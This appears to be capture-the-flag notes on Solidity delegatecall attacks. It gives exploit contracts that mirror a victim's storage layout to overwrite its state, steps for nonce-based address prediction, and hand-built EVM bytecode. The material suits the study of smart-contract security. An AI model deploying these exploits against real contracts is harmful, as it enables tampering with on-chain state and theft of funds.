# Delegatecall Attacks

## How Delegatecall Works
`delegatecall` executes the target's **code** with the **caller's** storage, msg.sender, and msg.value. This means the called contract can read/write the caller's storage.

## Attack Pattern: Storage Manipulation via Delegatecall

### Vulnerability
```solidity
contract Victim {
    mapping(string => bool) public flags;  // slot 0

    function execute(address target) public {
        (bool success, bytes memory ret) = target.delegatecall(
            abi.encodeWithSignature("run()")
        );
        require(success);
    }
}
```

### Exploit Contract (must mirror storage layout)
```solidity
contract Exploit {
    mapping(string => bool) public flags;  // MUST be at same slot as Victim

    function run() external returns (bool) {
        flags["target_key"] = true;  // Writes to Victim's storage
        return true;
    }
}
```

### Critical: Storage Layout Matching
The exploit contract **must** declare variables in the same order as the victim:
```solidity
// Victim layout:
// slot 0: mapping(string => address) destinations
// slot 1: mapping(string => bool) isActive
// slot 2: bool standby

// Exploit MUST mirror this exactly:
contract Exploit {
    mapping(string => address) public destinations;  // slot 0
    mapping(string => bool) public isActive;          // slot 1
    bool standby;                                     // slot 2

    function connect() external returns (bool) {
        isActive["targetKey"] = true;  // Writes to Victim's slot 1
        return true;
    }
}
```

## Delegatecall + No Code at Target
- `delegatecall` to address with **no code** returns `(true, empty_bytes)`
- `abi.decode(empty_bytes, (bool))` **reverts** (insufficient data)
- This means: if target has no code, the call fails at the decode step

## Delegatecall + CREATE Nonce Prediction
When delegatecall targets are hardcoded but have no code:
1. Compute which EOA nonce produces the target address
2. Bump nonce with dummy transactions
3. Deploy exploit contract at matching nonce
4. Trigger the delegatecall -- now it executes your code in victim's context

## Raw Bytecode Approach (no Solidity compiler)
```python
# SSTORE(slot, 1) + RETURN(true)
# PUSH1 1, PUSH32 slot, SSTORE, PUSH1 1, PUSH1 0, MSTORE, PUSH1 0x20, PUSH1 0, RETURN
runtime = "6001" + "7f" + slot_hex + "55" + "6001" + "6000" + "52" + "6020" + "6000" + "f3"
# Init code: copy runtime to memory and return it
init = f"60{len(bytes.fromhex(runtime)):02x}" + "80" + "600b" + "6000" + "39" + "6000" + "f3"
deploy_bytecode = "0x" + init + runtime
```

**Tip**: Using `solcx.compile_source()` with mirrored storage layout is more reliable than hand-crafted bytecode.
